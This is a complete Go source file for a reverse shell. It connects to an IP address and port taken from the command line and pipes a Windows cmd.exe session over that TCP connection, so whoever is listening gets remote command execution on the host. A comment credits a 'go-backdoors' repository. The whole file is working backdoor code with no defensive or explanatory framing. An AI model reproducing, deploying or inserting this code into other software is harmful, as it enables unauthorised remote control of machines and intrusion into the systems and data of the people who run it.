package main

import (
	"log"
	"net"
	"os/exec"
	"os"
)

// Some references used from here: https://github.com/LukeDSchenk/go-backdoors/blob/master/revshell.go

func make_connection(conn net.Conn) {

	var message string = "Successful connection from " + conn.LocalAddr().String()
	_, err := conn.Write([]byte(message + "\n"))
	if err != nil {
		log.Fatalln("Error making outbound connection: ", err)
		os.Exit(2)
	}

	cmd := exec.Command("cmd.exe")

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	cmd.Run()
}

func main() {

	var ip string = os.Args[1]
	var port string = os.Args[2]

	conn, err := net.Dial("tcp", ip + ":" + port)
	if err != nil {
		log.Fatalln("Unable to connect to remote host")
	} else {
		log.Printf("Connected to target on port " + port + "\n")
	}

	make_connection(conn)

}